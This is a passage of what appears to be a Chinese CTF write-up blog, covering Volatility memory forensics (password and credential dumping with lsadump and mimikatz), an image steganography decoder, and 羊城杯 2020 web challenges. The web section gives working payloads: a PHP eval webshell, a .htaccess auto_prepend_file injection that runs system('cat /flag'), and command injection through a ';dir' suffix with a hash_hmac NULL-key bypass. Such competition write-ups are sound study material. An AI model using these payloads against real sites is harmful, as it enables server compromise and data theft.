title="法一"></a>法一</h4><p>之前长安杯做过PowerShell的取证题，PowerShell历史命令文件路径为<br><code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code><br>所以我们直接去filescan<code>ConsoleHost_history.txt</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/20.png"><br> dump一下<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/21.png"><br>cat 一下下<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/22.png"><br>AES解密即可<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/23.png"></p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>因为<code>ConsoleHost_history.txt</code>为文本形式，所以利用strings转换一下直接搜索<code>flag&#123;</code>即可<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/24.png"></p><h3 id="Imageception"><a href="#Imageception" class="headerlink" title="Imageception"></a>Imageception</h3><p>题目说明 ：<br>“The painter has the universe in his mind and hands.”<br>-Leonardo Da Vinci<br>题目名称为imageception，所以直接FileScan搜索<br><code>python vol.py -f ./BBCTF/Imageception.raw windows.filescan.FileScan | grep &quot;imageception&quot;</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/25.png"><br>发现有个<code>imageception.png</code> 把他dump下来<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/26.png"><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/27.png"></p><h2 id="陇剑杯-2021-内存分析"><a href="#陇剑杯-2021-内存分析" class="headerlink" title="[陇剑杯 2021]内存分析"></a>[陇剑杯 2021]内存分析</h2><p>tips：<code>no space but underline</code></p><h3 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h3><p>网管小王制作了一个虚拟机文件，让您来分析后作答： 虚拟机的密码是_____________。（密码中为flag{xxxx}，含有空格，提交时不要去掉）<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/28.png"><br><code>volatility -f /home/kali/桌面/Target.vmem  --profile=Win7SP1x64_23418 lsadump</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/29.png"><br>也可以用mimikatz插件<br><code>volatility -f Target.vmem --profile=Win7SP1x64 mimikatz</code></p><h3 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h3><p>网管小王制作了一个虚拟机文件，让您来分析后作答： 虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为_____________。（解题过程中需要用到上一题答案中flag{}内的内容进行处理。本题的格式也是flag{xxx}，含有空格，提交时不要去掉）。<br>图片要找文件<br><code>volatility -f /home/kali/桌面/Target.vmem  --profile Win2008R2SP1x64_23418 filescan</code><br>找到带华为的文件<br><code>volatility -f /home/kali/桌面/Target.vmem  --profile Win2008R2SP1x64_23418 dumpfiles -Q 0x000000007d8c7d10 -D /home/kali/桌面</code><br>dump下来<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/30.png"><br>改后缀dat为exe<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/31.png"><br>得到一个文件夹，里面是加密的<br>华为备份文件解密工具：<br><code>[https://github.com/RealityNet/kobackupdec](https://github.com/RealityNet/kobackupdec)</code><br>注意：<br><code>&quot;C:Desktop\kobackupdec-master\...&quot;</code>为上面解压出来的文件夹路径，<code>&quot;C:Desktop\kobackupdec-master\backup&quot;</code>要在命令添加<code>backup</code>来储存解密后的文件<br><code> python kobackupdec.py -vvv &quot;W31C0M3_T0_THiS_34SY_F0R3NSiCX&quot; &quot;C:Desktop\kobackupdec-master\...&quot; &quot;C:Desktop\kobackupdec-master\backup&quot;</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/32.png"><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/33.png"><br><code>flag&#123;TH4NK Y0U FOR DECRYPTING MY DATA&#125;</code></p><h2 id="HUBUCTF-2022-新生赛-vmem"><a href="#HUBUCTF-2022-新生赛-vmem" class="headerlink" title="HUBUCTF 2022 新生赛-vmem"></a>HUBUCTF 2022 新生赛-vmem</h2><p>内存取证，vol3文件dump不下来，只能用vol2<br>vol2安装：<a href="https://blog.csdn.net/qq_42947816/article/details/119395804">https://blog.csdn.net/qq_42947816/article/details/119395804</a><br><code>volatility -f /home/kali/桌面/Windows7.vmem imageinfo</code><br><img src="/wp/vmem/1.png"><br><code>volatility -f /home/kali/桌面/Windows7.vmem --profile=Win2008R2SP1x64_23418 filescan|grep &#39;flag</code><br><img src="/wp/vmem/2.png"><br>提取文件<br><code>volatility -f /home/kali/桌面/Windows7.vmem --profile=Win2008R2SP1x64_23418 dumpfiles -Q 虚拟地址 -D 保存位置</code><br>如：<br><code>volatility -f /home/kali/桌面/Windows7.vmem --profile=Win2008R2SP1x64_23418 dumpfiles -Q 0x000000005eb84f20 -D /home/kali/桌面/1</code><br>flag1：<br><code>the first part of flag is : NSSCTF&#123;W0w_y0u_G3t</code><br>flag2：<br><img src="/wp/vmem/3.png"><br>flag3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">flag3 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag3.txt&#x27;</span>).read()<br>flag_enc = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag3)):<br>    flag_enc += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(flag3[i]) ^ <span class="hljs-number">0xf</span> - <span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(flag_enc)<br><span class="hljs-comment"># &#125;al):&#123;m)yh&#123;&#125;)fo)oehn)`z)3)VPF|V^hg](t </span><br></code></pre></td></tr></table></figure><p>异或一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">enc=<span class="hljs-string">&#x27;&#125;al):&#123;m)yh&#123;&#125;)fo)oehn)`z)3)VPF|V^hg](t&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(enc[i]) ^ <span class="hljs-number">0xf</span> - <span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#the 3rd part of flag is : _YOu_WanT!&#125;                </span><br></code></pre></td></tr></table></figure><h2 id="NSSRound-1-Basic-cut-into-thirds"><a href="#NSSRound-1-Basic-cut-into-thirds" class="headerlink" title="NSSRound#1 Basic]cut_into_thirds"></a>NSSRound#1 Basic]cut_into_thirds</h2><p>题目说明：华强觉得这flag不甜，就把flag刀成了三份，分给了“基地”家族的老二、老四和老六。请将找到的三块按顺序用“-”连接，flag格式为NSSCTF{uuid}<br><code>volatility -f /home/kali/桌面/cut_into_thirds.raw --profile=Win7SP1x64 pslist</code><br>列出当前进程<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/34.png"><br><code>volatility -f /home/kali/桌面/cut_into_thirds.raw --profile=Win7SP1x64 procdump -p 1164 -D /home/kali/桌面/</code><br>运行一下导出的程序<code>part2:GRRGGYJNGQ4GKMBNMJRTONI=</code><br>base32：<code>4bca-48e0-bc75</code><br><code>volatility -f /home/kali/桌面/cut_into_thirds.raw --profile=Win7SP1x64 filescan</code><br>由前面知道可疑文件<br><code>0x0000000012191a20     16      0 R--rw- \Device\HarddiskVolume2\Users\CTF\Desktop\LookAtMe.zip</code><br>dump下来<br><code>part1:3930653363343839</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/35.png"><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/36.png"><br>lsa解密不成功<br>我mimikatz没装成功，呜呜呜太菜了<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/37.png"><br><code>MTEwOTFmNWI3ZTNh</code> -&gt; base64：<code>11091f5b7e3a</code><br><code>NSSCTF&#123;90e3c489-4bca-48e0-bc75-11091f5b7e3a&#125;</code></p><h2 id="蓝帽杯-2022-初赛-计算机取证"><a href="#蓝帽杯-2022-初赛-计算机取证" class="headerlink" title="[蓝帽杯 2022 初赛]计算机取证"></a>[蓝帽杯 2022 初赛]计算机取证</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><code>现对一个windows计算机进行取证，请您对以下问题进行分析解答。 从内存镜像中获得taqi7的开机密码是多少？</code></p><p><img src="https://c.img.dasctf.com/images/2023225/1677319309022-68cf9a92-f804-49eb-a25e-44e29b3ef8ac.png"></p><p><code>7f21caca5685f10d9e849cc84c340528</code> </p><p><img src="https://c.img.dasctf.com/images/2023225/1677319361974-8fa0560e-6f61-4837-80fa-02487d41b178.png"></p><p>也可以用Passware Kit Forensic </p><p><img src="https://c.img.dasctf.com/images/2023225/1677319723479-c5c1eca5-43f7-4d28-a4f2-82e18c8b8e1f.png"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><code>现对一个windows计算机进行取证，请您对以下问题进行分析解答。 制作该内存镜像的进程Pid号是多少？</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">volatility -f <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/桌面/</span><span class="hljs-number">1</span>.dmp --profile=Win7SP1x64_23418 pslist<br></code></pre></td></tr></table></figure><p><img src="https://c.img.dasctf.com/images/2023225/1677332184344-6fa7a610-2627-4fac-aab2-4d4e7f2c6d92.png"></p><p>MagnetRAMCaptu是镜像制作工具，该进程pid为2192</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">现对一个windows计算机进行取证，请您对以下问题进行分析解答。</span><br><span class="language-xml">bitlokcer分区某office文件中存在的flag值为？（答案参考格式：NSSCTF</span><span class="hljs-template-variable">&#123;abcABC123&#125;</span><span class="language-xml">）</span><br></code></pre></td></tr></table></figure><p>在取证大师内存分析工具可以导出1.dmp的Bitlocker key密钥<img src="https://c.img.dasctf.com/images/2023225/1677334485033-080a28ca-3467-43e8-818c-bb19b81bbd23.png"></p><p>利用这个密钥可以解码G.E01文件，取证大师有解密工具</p><p>得到：</p><p><img src="https://c.img.dasctf.com/images/2023225/1677334647687-6139c0a2-41cb-4d47-b805-c0c2f7e9a2ac.png"></p><p>然后利用里面的pass.txt字典来爆出文件密钥</p><p><img src="https://c.img.dasctf.com/images/2023225/1677334355976-58fd1ce2-d447-4441-ab58-931742c62e37.png"></p><p>打开得到</p><p><img src="https://c.img.dasctf.com/images/2023225/1677334291139-d1313fcd-26ce-4b98-bd8d-236d5033701b.png"></p><p><strong>flag{b27867b66866866686866883bb43536}</strong></p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">现对一个windows计算机进行取证，请您对以下问题进行分析解答。<br>TrueCrypt加密中存在的<span class="hljs-built_in">flag</span>值为？<br></code></pre></td></tr></table></figure><p>取证大师</p><p><img src="https://c.img.dasctf.com/images/2023225/1677334924886-bd5fc223-4dab-4a50-a95f-d54c360df00f.png"></p><p>挂载加密文件并解密</p><p><img src="https://c.img.dasctf.com/images/2023225/1677335754783-3b6c63bf-2a22-4be3-a62a-682b3f73e4b0.png"></p><p>得到：</p><p><img src="https://c.img.dasctf.com/images/2023225/1677335799435-f7497128-d697-40b5-9571-67bf225bdce1.png"></p><p>爆破一下</p><p><img src="https://c.img.dasctf.com/images/2023225/1677336187380-1f30a4c4-5449-4cc7-bdb9-687fc9c56ec2.png"></p><p>flag{1349934913913991394cacacacacacc}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MMACTF 2015-miyako</title>
    <link href="/2023/02/24/MMACTF%202015-miyako/"/>
    <url>/2023/02/24/MMACTF%202015-miyako/</url>
    
    <content type="html"><![CDATA[<p><img src="https://c.img.dasctf.com/images/2023224/1677249633233-04ad9924-59d3-4eff-8bb4-d619375a710d.png"></p><p>提取图片像素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> sys<br>im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;stego.png&quot;</span>)<br>bands = <span class="hljs-string">&#x27;&#x27;</span>.join(im.getbands())<br>width, height = im.size<br>pre=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        pixels = im.getpixel((w,h))<br>        <span class="hljs-keyword">if</span> bands==<span class="hljs-string">&#x27;RGBA&#x27;</span>:<br>            r,g,b,a = pixels<br>            <span class="hljs-built_in">print</span> (r,g,b,a)<br>        <span class="hljs-keyword">elif</span> bands==<span class="hljs-string">&#x27;RGB&#x27;</span>:<br>            r,g,b = pixels<br>            <span class="hljs-built_in">print</span> (r,g,b)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> (pixels)<br></code></pre></td></tr></table></figure><p>仔细观察，我们发现每个像素及其相邻像素略有不同：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">224 </span><span class="hljs-number">216</span> <span class="hljs-number">216</span><br><span class="hljs-symbol">229 </span><span class="hljs-number">221</span> <span class="hljs-number">222</span><br><span class="hljs-symbol">223 </span><span class="hljs-number">217</span> <span class="hljs-number">222</span><br><span class="hljs-symbol">227 </span><span class="hljs-number">221</span> <span class="hljs-number">217</span><br></code></pre></td></tr></table></figure><p>第一个像素 RGB 值与第二个像素之间的差异约为 6，第二个和第四个像素 RGB 值之间的差异为 5，依此类推。<br>差值的正负号代表了0，1<br>每隔一个像素，我们计算蓝色值与前一个像素的差值，并将其解释为 0（如果为负）或 1（如果为正）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> sys<br>im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;stego.png&quot;</span>)<br>pix = im.load()<br>width, height = im.size<br><br>msg=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,height):<br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,width,<span class="hljs-number">2</span>):<br>        nr=ng=nb=<span class="hljs-number">0</span><br>        r,g,b=pix[w,h]<br>        pr,pg,pb=pix[w-<span class="hljs-number">1</span>,h]<br>        db = b-pb<br>        <span class="hljs-keyword">if</span> db&lt;<span class="hljs-number">0</span>:<br>            pix[w,h]=(<span class="hljs-number">256</span>,<span class="hljs-number">256</span>,<span class="hljs-number">256</span>)<br>            msg+=<span class="hljs-string">&#x27;0&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            pix[w,h]=(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>            msg+=<span class="hljs-string">&#x27;1&#x27;</span><br>        pix[w-<span class="hljs-number">1</span>,h]=(<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>)<br><span class="hljs-built_in">print</span> (msg)<br></code></pre></td></tr></table></figure><p>然后转字符串<br><img src="https://c.img.dasctf.com/images/2023224/1677250305921-0528fccf-6824-4169-842f-ba1a10f12d60.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯 2020-web</title>
    <link href="/2023/02/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020-web/"/>
    <url>/2023/02/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020-web/</url>
    
    <content type="html"><![CDATA[<h1 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h1><p>御剑<br><img src="/wp/ycb2020/1.png"><br><img src="/wp/ycb2020/2.png"></p><p><img src="/wp/ycb2020/3.png"><br>或者连antsward<br>base64转图片<br><a href="https://tool.jisuapi.com/base642pic.html">https://tool.jisuapi.com/base642pic.html</a><br><img src="/wp/ycb2020/4.png"></p><h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nHello, world&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>file_put_contents($filename, $content . &quot;\nHello, world&quot;);</code><br>想到可以传木马，<code>$filename</code>传文件名<code>$content</code>传木马，但是后面拼接了个<code>\nHello, world</code><br><code>?content=&lt;?php eval($_POST[&#39;a&#39;]);?&gt;&amp;filename=a.php</code><br><img src="/wp/ycb2020/5.png"><br>被当html解析<br>然后<br><code>if ($file !== &quot;index.php&quot;) &#123;unlink($file); &#125;</code>限制了页面在index.php<br>php_value auto_prepend_file：<a href="https://www.php.cn/php-weizijiaocheng-293703.html">https://www.php.cn/php-weizijiaocheng-293703.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">php_value auto_prepend_fil\ <br>e .htaccess <br><span class="hljs-comment">#&lt;?php system(&#x27;cat /fla&#x27;.&#x27;g&#x27;);?&gt;\</span><br><br></code></pre></td></tr></table></figure><p><code>#是.hatccess文件的写入形式</code><br>在php执行时#后的语句同样会被解析,反斜杠绕过file过滤<br>末尾的\转义掉<code>\nHello, world</code>的换行<br>相当于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">php_value auto_prepend_fil\ <br>e .htaccess <br><span class="hljs-comment">#&lt;?php system(&#x27;cat /fla&#x27;.&#x27;g&#x27;);?&gt;nHello, world</span><br><br></code></pre></td></tr></table></figure><p>需要对一些符合url编码，因为get传参，需要编码两次<br><code>?filename=.htaccess&amp;content=php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system(&#39;cat%20/f*&#39;)%3B%3F%3E%5C</code><br><img src="/wp/ycb2020/6.png"></p><h1 id="Blackcat"><a href="#Blackcat" class="headerlink" title="Blackcat"></a>Blackcat</h1><p>源码在mp3里面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;clandestine&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>]))<br>  <span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$hh</span> !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>最终目的是通过<code>echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);</code>来读取文件<br>那么就要绕过前面的几个<code>die</code>来让脚本继续执行<br>有3个参数：</p><ol><li><code>Black-Cat-Sheriff</code></li><li><code>One-ear</code></li><li><code>White-cat-monitor</code></li></ol><p>这里exec回显一行结果，用dir来找目录下文件<br>这里将传入的<code>&#39;One-ear&#39;</code>与<code>&quot;nc&quot;</code>连接，可以用分号来执行多条命令，所以传入<code>One-ear=;dir</code><br>再看另外两个参数<br><img src="/wp/ycb2020/7.png"><br><code>$clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);</code><br>对传入的<code>White-cat-monitor</code>以<code>$clandestine</code>为key计算sha256，key由环境变量获取<br>而这次计算的结果<code>$clandestine</code>作为下一个$hh的key<br><code>$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);</code><br>但<code>$clandestine</code>我们无法得知，所以<code>if($hh !== $_POST[&#39;Black-Cat-Sheriff&#39;])</code>无法成立<br>但我们对<code>White-cat-monitor</code>传入数组，让<code>$clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);</code>报错返回NULL，这样我们下一个$hh的key就是NULL了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>,<span class="hljs-string">&#x27;;dir&#x27;</span>,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hh</span>;<br><span class="hljs-meta">?&gt;</span><br><span 